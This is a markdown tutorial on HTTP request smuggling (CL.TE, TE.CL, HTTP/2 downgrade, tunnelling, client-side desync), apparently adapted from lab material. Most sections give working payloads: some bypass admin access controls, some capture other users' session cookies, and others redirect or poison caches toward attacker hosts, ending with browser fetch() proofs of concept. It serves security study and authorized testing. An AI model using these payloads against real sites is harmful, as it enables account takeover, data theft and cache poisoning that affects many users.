# HTTP request smuggling

HTTP request smuggling is a server-side attack that takes advantage of discrepancies in how web servers and proxies interpret HTTP requests, potentially leading to request manipulation, security bypasses, or the exposure of sensitive data.

### Table of Content

- **[Explanation](#explanation)**
- **[HTTP/1.1](#htpp11)**
    - [How do HTTP request smuggling vulnerabilities arise?](#how-do-http-request-smuggling-vulnerabilities-arise)
- **[Perform the attack](#perfom-the-attack)**
    - [prepare smuggling](#prepare)
    - [Detect type of smuggling](#detect-type-of-smuggling)
    - [CL.TE vulnerabilities](#clte-vulnerabilities)
    - [TE.TE: obfuscating the TE header](#tete-obfuscating-the-te-header)
- **[Exploit](#exploit)**
    - [Using HTTP request smuggling to bypass front-end security controls](#using-http-request-smuggling-to-bypass-front-end-security-controls)
    - [Revealing front-end request rewriting](#revealing-front-end-request-rewriting)
    - [Bypassing client authentication](#bypassing-client-authentication)
    - [Capturing other users' requests](#capturing-other-users-requests)
    - [Using HTTP request smuggling to exploit reflected XSS](#using-http-request-smuggling-to-exploit-reflected-xss)
    - [Using HTTP request smuggling to turn an on-site redirect into an open redirect](#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)
    - [Perfom web cache poisoning](#perfom-web-cache-poisoning)
    - [Perform web cache deception](#perform-web-cache-deception)
- **[HTTP/2](#http2)**
- **[Exploit]**
    - [H2.CL vulnerabilities](#h2cl)
    - [H2.TE vulnerabilities](#h2te-vulnerabilities)
    - [Response queue poisoning](#response-queue-poisoning)
    - [Request smuggling via CRLF injection](#request-smuggling-via-crlf-injection)
    - [Request splitting](#request-splitting)
- **[HTTP Request Tunnelling](#http-request-tunnelling)**
    - [Leaking internal headers via HTTP/2 request tunnelling](#leaking-internal-headers-via-http2-request-tunnelling)
    - [Non-blind request tunnelling using HEAD](#non-blind-request-tunnelling-using-head)
    - [Web cache poisoning via HTTP/2 request tunnelling](#web-cache-poisoning-via-http2-request-tunnelling)
- **[Browser-powered request smuggling](#browser-powered-request-smuggling)**
    - [CL.0 request smuggling](#cl0-request-smuggling)
    - [Client-side desync attacks](#client-side-desync-attacks)

## Explanation

Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins.

An attacker can simulate the end of it request to be interpreted by the back-end server as the start of the next request. At this point, he can inject some code in the next request.

![illustration of smuggling attack](/web/img/smuggling-http-request-to-back-end-server.svg)

## HTPP/1.1

### How do HTTP request smuggling vulnerabilities arise?

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

If both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:

- Some servers do not support the Transfer-Encoding header in requests.
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.

If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

*Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. This process is known as HTTP downgrading.*

## Perfom the attack

Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

- CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

### Prepare

![prepare](/web/img/prepare-smuggling.png)

### Detect type of smuggling

![detect](/web/img/detect-smugglin.png)

```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```

```
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### CL.TE vulnerabilities

The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.

We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Content-Length = 6  = 0\r\n + \r\n + x

The front-end server processes the Content-Length header and determines that the request body is 6 bytes long, up to the end of X. This request is forwarded on to the back-end server.

The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, X, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

So if you send this twice, next request will be handle as `XPOST /HTTP/1.1`.

### TE.CL vulnerabilities

Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### TE.TE: obfuscating the TE header

TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## Exploit

### Using HTTP request smuggling to bypass front-end security controls

In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls.

Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack:

#### CL.TE

request send:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

x=
```

Poisoned request: 

```
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

x=GET /home HTTP/1.1
Host: vulnerable-website.com
```

#### TE.CL

Request send:

```
POST / HTTP/1.1
Host: 0a400088045445ac81ac2f150045003b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

x =
0

```

Poisonous request: 

```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

x =POST / HTTP/1.1
Host: 0a400088045445ac81ac2f150045003b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
...
```

### Revealing front-end request rewriting

In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers. For example, the front-end server might:

- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an X-Forwarded-For header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks.

In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

Suppose an application has a login function that reflects the value of the email parameter:

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
This results in a response containing the following:

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

the back-end server will process the smuggled request and treat the rewritten second request as being the value of the email parameter:

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external" >
```

:warning: *Since the final request is being rewritten, you don't know how long it will end up. The value in the Content-Length header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete.*

### Bypassing client authentication

As part of the TLS handshake, servers authenticate themselves with the client (usually a browser) by providing a certificate. This certificate contains their "common name" (CN), which should match their registered hostname. The client can then use this to verify that they're talking to a legitimate server belonging to the expected domain.

Some sites go one step further and implement a form of mutual TLS authentication, where clients must also present a certificate to the server. In this case, the client's CN is often a username or suchlike, which can be used in the back-end application logic as part of an access control mechanism.

```
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

As these headers are supposed to be completely hidden from users, they are often implicitly trusted by back-end servers.

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

x =
```

### Capturing other users' requests

If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. These may include session tokens or other sensitive data submitted by the user. Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on.

to exploit this vulnerability, it is the same idea as [Revealing front-end request rewriting](#revealing-front-end-request-rewriting) by writing somewhere in the code the next request send by a user to steal sensitive informations such as cookies: CL.TE example:

request: 

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

poisonous request by a user:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

### Using HTTP request smuggling to exploit reflected XSS

[-> explanation here](/web/client-side/xss/xss.md#using-http-request-smuggling)

### Using HTTP request smuggling to turn an on-site redirect into an open redirect

Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. For example:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

The smuggled request will trigger a redirect to the attacker's website, which will affect the next user's request that is processed by the back-end server. For example:

```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

Here, the user's request was for a JavaScript file that was imported by a page on the web site. The attacker can fully compromise the victim user by returning their own JavaScript in the response.

### Perfom web cache poisoning

If any part of the front-end infrastructure performs caching of content (generally for performance reasons), then it might be possible to poison the cache with the off-site redirect response. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

- First : find and control a redirect URL with smuggling request:

Example:

`/post/next?postId=2` -> redirect to `/post?postId=2`, so if i inject a host to `/post/next?postId=2` request, it gonna build a response : `http://exploit-server/post?postId=2`

```
POST / HTTP/1.1
Host: vuln.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Transfer-Encoding: chunked

0

GET /post/next?postId=2 HTTP/1.1
Host: exploit-server.net
Content-Length: 3

x=
```

- Second step is to find a file requested which performs caching of content:

example: `<script type="text/javascript" src="/resources/js/tracking.js"></script>`

This request respond 

```
HTTP/2 200 OK
...
Cache-Control: max-age=30
Age: 0
...
```

Where age is the time which the file is stored in the cache and returned when we perform a get request to the file.

- Step 3: send the smuggling request to perfom a redirection to our file stocked on our exploit server. Then submit a request to the javascript file stored 30 seconds:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /post/next?postId=2 HTTP/1.1
Host: exploit-0ab100e5032243cb810a2e360137006f.exploit-server.net
Content-Length: 10

x=
```

Poisoined request:

```
GET /post/next?postId=2 HTTP/1.1
Host: attacker-website.com
Content-Length: 10

x=GET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

The smuggled request reaches the back-end server, which responds as before with the off-site redirect. The front-end server caches this response against what it believes is the URL in the second request, which is /static/include.js:

From this point onwards, when other users request this URL, they receive the redirection to the attacker's web site.

### Perform web cache deception

Diff between cache poisoning and deception:

- In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
- In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

In this variant, the attacker smuggles a request that returns some sensitive user-specific content. For example:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
foo: 
```

poisoning request:

```
GET /private/messages HTTP/1.1
Foo: GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

The back-end server responds to this request in the normal way. The URL in the request is for the user's private messages and the request is processed in the context of the victim user's session. The front-end server caches this response against what it believes is the URL in the second request, which is /static/some-image.png:

```
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

The attacker then visits the static URL and receives the sensitive content that is returned from the cache.

An important caveat here is that the attacker doesn't know the URL against which the sensitive content will be cached, since this will be whatever URL the victim user happened to be requesting when the smuggled request took effect. The attacker might need to fetch a large number of static URLs to discover the captured content.

## HTTP/2

Request smuggling is fundamentally about exploiting discrepancies between how different servers interpret the length of a request. HTTP/2 introduces a single, robust mechanism for doing this, which has long been thought to make it inherently immune to request smuggling.

### HTTP downgrading

![https downgrading](/web/img/http2-downgrading.jpg)

This works because each version of the protocol is fundamentally just a different way of representing the same information. Each item in an HTTP/1 message has an approximate equivalent in HTTP/2.

HTTP/2 downgrading can expose websites to request smuggling attacks, even though HTTP/2 itself is generally considered immune when used end to end.


## H2.CL

HTTP/2 requests don't have to specify their length explicitly in a header. During downgrading, this means front-end servers often add an HTTP/1 Content-Length header, deriving its value using HTTP/2's built-in length mechanism.

Interestingly, HTTP/2 requests can also include their own content-length header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request.

The spec dictates that any content-length header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading. As a result, it may be possible to smuggle requests by injecting a misleading content-length header.

HTTP2 Front-end

header | value
--- | ---
:method | `POST`
:path | `/example`
:authority | `vulnerable-website.com`
content-type | `application/x-www-form-urlencoded`
content-length | `0`

body:

```
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

HTTP1 backend

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

### H2.TE vulnerabilities

HTTP2 Front-end

header | value
--- | ---
:method | `POST`
:path | `/example`
:authority | `vulnerable-website.com`
content-type | `application/x-www-form-urlencoded`
transfer-encoding | `chunked`

body:

```
0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

HTTP1 backend

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

### Response queue poisoning

Response queue poisoning is a powerful request smuggling attack that enables you to steal arbitrary responses intended for other users, potentially compromising their accounts and even the entire site.

#### Prerequisite

- The TCP connection between the front-end server and back-end server is reused for multiple request/response cycles.
- The attacker is able to successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server.
- The attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request because they can't determine where the request is supposed to end.

#### Stealing other users' responses

![Stealing other users' responses](/web/img/stealing-other-users-responses.jpg)

payload for H2.TE:

```
POST /x HTTP/2
Host: vuln.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: vuln.net
\r\n
\r\n
```

This respond not found and return a not found to the next request, the idea is to be the third request to catch the answer of the victim request.

### Request smuggling via CRLF injection

Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the content-length or stripping any transfer-encoding headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.

On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that \r\n no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split:

```
foo	bar\r\nTransfer-Encoding: chunked
```

This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the \r\n will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:

```
Foo: bar
Transfer-Encoding: chunked
```

:warning: to write `\r\n` in HTTP header in burpsuite, you need to go on inspector -> Request headers -> and modifie the value -> add `\r\n` by pressing SHIFT + ENTER.

### Request splitting

With [response queue poisoning](#response-queue-poisoning) we saw how split the request in two in the body section, but we can do it in headers too:

header | value
--- | ---
:method | `GET`
:path | `/example`
:authority | `vulnerable-website.com`
foo | `bar\r\n\r\nGET /admin HTTP/1.1\r\nHost:vulnerable-website.com`

This is useful in cases where the content-length is validated and the back-end doesn't support chunked encoding.

## HTTP Request Tunnelling

Some servers only allow requests originating from the same IP address or the same client to reuse the connection. Others won't reuse the connection at all, which limits what you can achieve through classic request smuggling as you have no obvious way to influence other users' traffic.

![no connection reuse](/web/img/no-connection-reuse.png)

This still allow your to potentially  hide a request and its matching response from the front-end altogether.

You can use this technique to bypass front-end security measures that may otherwise prevent you from sending certain requests. In fact, even some mechanisms designed specifically to prevent request smuggling attacks fail to stop request tunnelling.

### Leaking internal headers via HTTP/2 request tunnelling

You can potentially trick the front-end into appending the internal headers inside what will become a body parameter on the back-end. Let's say we send a request that looks something like this:

header | value
--- | ---
:method | `POST`
:path | `/example`
:authority | `vulnerable-website.com`
content-type | `application/x-www-form-urlencoded`
foo | `bar\r\nContent-Length: 200\r\ncomment=`

body:

```
x=1
```

![leaking internal header](/web/img/leaking-internal-header.png)

### Non-blind request tunnelling using HEAD

Blind request tunnelling can be tricky to exploit, but you can occasionally make these vulnerabilities non-blind by using HEAD requests.

A HEAD request is a type of HTTP request method that is similar to a GET request but is used to request the headers of a resource rather than the resource itself. When you make a HEAD request to a server, it returns only the headers of the corresponding GET request, without the actual data.

Responses to HEAD requests often contain a content-length header even though they don't have a body of their own. This normally refers to the length of the resource that would be returned by a GET request to the same endpoint. Some front-end servers fail to account for this and attempt to read in the number of bytes specified in the header regardless. If you successfully tunnel a request past a front-end server that does this, this behavior may cause it to over-read the response from the back-end. As a result, the response you receive may contain bytes from the start of the response to your tunnelled request.

Request:

header | value
--- | ---
:method | `HEAD`
:path | `/example`
:authority | `vulnerable-website.com`
foo | `bar\r\nGET /tunnelled HTTP/1.1\r\nHost: vulnerable-website.com\r\nx:x`

Response:

```
:status	        200
content-type	text/html
content-length	131

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 4286

<!DOCTYPE html>
<h1>Tunnelled</h1>
<p>This is a tunnelled respo
```

As you're effectively mixing the content-length header from one response with the body of another, using this technique successfully is a bit of a balancing act.

If the endpoint to which you send your HEAD request returns a resource that is shorter than the tunnelled response you're trying to read, it may be truncated before you can see anything interesting, as in the example above. On the other hand, if the returned content-length is longer than the response to your tunnelled request, you will likely encounter a timeout as the front-end server is left waiting for additional bytes to arrive from the back-end.

Fortunately, with a bit of trial and error, you can often overcome these issues using one of the following solutions:

- Point your HEAD request to a different endpoint that returns a longer or shorter resource as required.
- If the resource is too short, use a reflected input in the main HEAD request to inject arbitrary padding characters. Even though you won't actually see your input being reflected, the returned content-length will still increase accordingly.
- If the resource is too long, use a reflected input in the tunnelled request to inject arbitrary characters so that the length of the tunnelled response matches or exceeds the length of the expected content.

### Web cache poisoning via HTTP/2 request tunnelling

With non-blind request tunnelling, you can effectively mix and match the headers from one response with the body of another. If the response in the body reflects unencoded user input, you may be able to leverage this behavior for reflected XSS in contexts where the browser would not normally execute the code.

## Browser-powered request smuggling

Browser-powered request smuggling is an advanced technique of HTTP request smuggling that leverages features of modern web browsers to bypass security mechanisms and perform request smuggling attacks. In this scenario, the attacker uses a victim's web browser to issue HTTP requests with malicious intent.

### CL.0 request smuggling

The idea of CL.0 vulnerability is to provide a content lenght including a body with a new malicious request. Everything is sent to the backend, and the backend should ignore the content length because it has no sens on this request so it consider the end of the header, the end of the request and process the body as a new request.

#### Test CL.0

Payload HTTP/1.1:

```
POST /vulnerable-endpoint HTTP/1.1 
Host: vulnerable-website.com 
Connection: keep-alive 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 34 

GET /hopefully404 HTTP/1.1
Foo: x
```

To try it on burp : take this request and a normal request
- create a tab group with the `+`
- include them in the group
- select next to send, `send group(single connection)`

:warning: The Connection header of the first request should has keep-alive.

If everything has worked, second request should return 404 not found.

Another way to test it could be to send a Content-Length longer than the body, and if the server immediately response it means it dont handle content length.

As with CL.0 vulnerabilities, we've found that the most likely candidates are endpoints that aren't expecting POST requests, such as static files or server-level redirects.

#### Exloit

- Find a endpoint : the most likely candidates are endpoints that aren't expecting POST requests are static files or server-level redirects.
- Change `/hopefully404` to try some unauthorize path and bypass verification.

#### H2.0

Websites that downgrade HTTP/2 requests to HTTP/1 may be vulnerable to an equivalent "H2.0" issue if the back-end server ignores the Content-Length header of the downgraded request.

### Client-side desync attacks

:warning: *For these attacks to work, it's important to note that the target web server must not support HTTP/2. Client-side desyncs rely on HTTP/1.1 connection reuse, and browsers generally favor HTTP/2 where available. One exception to this rule is if you suspect that your intended victim will access the site via a forward proxy that only supports HTTP/1.1.*

A client-side desync (CSD) is an attack that makes the victim's web browser desynchronize its own connection to the vulnerable website. This can be contrasted with regular request smuggling attacks, which desynchronize the connection between a front-end and back-end server.

Web servers can sometimes be encouraged to respond to POST requests without reading in the body. If they subsequently allow the browser to reuse the same connection for additional requests, this results in a client-side desync vulnerability.

In high-level terms, a CSD attack involves the following stages:

- The victim visits a web page on an arbitrary domain containing malicious JavaScript.
- The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.
- The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.
- The JavaScript then triggers a follow-up request down the poisoned connection. This is appended to the malicious prefix, eliciting a harmful response from the server.

As these attacks don't rely on parsing discrepancies between two servers, this means that even single-server websites may be vulnerable.

#### Test:

The first step in testing for client-side desync vulnerabilities is to identify or craft a request that causes the server to ignore the Content-Length header. The simplest way to probe for this behavior is by sending a request in which the specified Content-Length is longer than the actual body:

- If the request just hangs or times out, this suggests that the server is waiting for the remaining bytes promised by the headers.
- If you get an immediate response, you've potentially found a CSD vector. This warrants further investigation.

As with CL.0 vulnerabilities, we've found that the most likely candidates are endpoints that aren't expecting POST requests, such as static files or server-level redirects.

Other way:

You may be able to elicit this behavior by triggering a server error:

- `GET /%2e%2e%2f HTTP/1.1`
- `Referer: https://evil-user.net/?%00`
- `Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x`

#### Confirm:

To confirm desync vector try send another request after the test and see if the primary body is reused in the second request such has [CL.0](#cl0-request-smuggling).

#### Building a proof of concept in a browser

- Go to the site from which you plan to launch the attack on the victim. This must be on a different domain to the vulnerable site and be accessed over HTTPS.
- Open the browser's developer tools and go to the Network tab.
- Make the following adjustments:
    - Select the Preserve log option.
    - Right-click on the headers and enable the Connection ID column.
- This ensures that each request that the browser sends is logged on the Network tab, along with details of which connection it used. This can help with troubleshooting any issues later.
- Switch to the Console tab and use fetch() to replicate the desync probe you tested in Burp. The code should look something like this:

```js
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // malicious prefix
    mode: 'no-cors', // ensures the connection ID is visible on the Network tab
    credentials: 'include' // poisons the "with-cookies" connection pool
}).then(() => {
    location = 'https://vulnerable-website.com/' // uses the poisoned connection
})
```

In addition to specifying the POST method and adding our malicious prefix to the body, notice that we've set the following options:
- mode: 'no-cors' - This ensures that the connection ID of each request is visible on the Network tab, which can help with troubleshooting.
- credentials: 'include' - Browsers generally use separate connection pools for requests with cookies and those without. This option ensures that you're poisoning the "with-cookies" pool, which you'll want for most exploits.

When you run this command, you should see two requests on the Network tab. The first request should receive the usual response. If the second request receives the response to the malicious prefix (in this case, a 404), this confirms that you have successfully triggered a desync from your browser.

#### Handling redirects

as we've mentioned already, requests to endpoints that trigger server-level redirects are a common vector for client-side desyncs. When building an exploit, this presents a minor obstacle because browsers will follow this redirect, breaking the attack sequence. Thankfully, there's an easy workaround.

By setting the mode: 'cors' option for the initial request, you can intentionally trigger a CORS error, which prevents the browser from following the redirect. You can then resume the attack sequence by invoking catch() instead of then(). For example:

```js
fetch('https://vulnerable-website.com/redirect-me', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    location = 'https://vulnerable-website.com/'
})
```

The downside to this approach is that you won't be able to see the connection ID on the Network tab, which may make troubleshooting more difficult.

---

[**:arrow_right_hook: Back home**](/README.md)